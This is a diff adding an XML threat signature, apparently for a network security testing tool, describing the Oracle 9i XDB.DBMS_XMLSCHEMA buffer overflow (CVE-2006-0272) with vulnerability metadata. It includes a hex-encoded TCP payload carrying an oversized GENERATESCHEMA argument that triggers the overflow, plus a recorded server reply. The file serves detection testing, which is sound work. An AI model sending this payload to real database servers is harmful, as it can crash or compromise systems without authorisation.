@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle Database Server XDB.DBMS_XMLSCHEMA Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in the Oracle Database Server product. The vulnerability exists due to insufficient validation of the arguments supplied to DBMS_XMLSCHEMA packages. A remote attacker with valid user credentials may use this vulnerability to execute arbitrary code with privileges of the database server process."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Oracle_Oracle9i_Standard_Edition"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Oracle_Oracle9i_Standard_Edition_9.2.7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.argeniss.com/research/ARGENISS-ADV-010601.txt"/>
+    <CVEID display="true" value="CVE-2006-0272"/>
+    <bugtraqID display="true" value="16287"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="40912a63233ef37da43b68bdfcf547dc"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633366658549195000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203389420" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="ISQLdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="G"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$ISQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="02580000060400000000035E1761800000000000003CBCA105BE01000054D09F050D0000000000000088D09F050000000001000000000000000000000000000000000000000000000000000000000000008AD09F0514AAA10500000000FE4053454C454354205844422E44424D535F584D4C534348454D412E47454E4552415445534348454D4120282761272C202741414141414141414141414141414141404141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414140414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141404141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414140414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141413E414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414127292046524F4D204455414C0001000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="020A00000604000000001019247D6A73707760170000786A011B0F391D970B000000000000000000000100000039003A000000D0070000000000000000000010000000100000000000000000000000000002010001000000000000000001FFFF000000FEFF5844422E44424D535F584D4C534348454D412E47454E4552415445534348454D41282741272C274141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410003000000035359530700000007584D4C5459504500000700000007786A011B0F391D00000000E81F0000080500D7170F0000000000020000000000000000000000000000000401000000150001000000000000000000000200BA0103000000000000000000000000000000000000000000000000000017000001000000360100000000000024F2FB0500000000000000000000000000000000000000000000000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
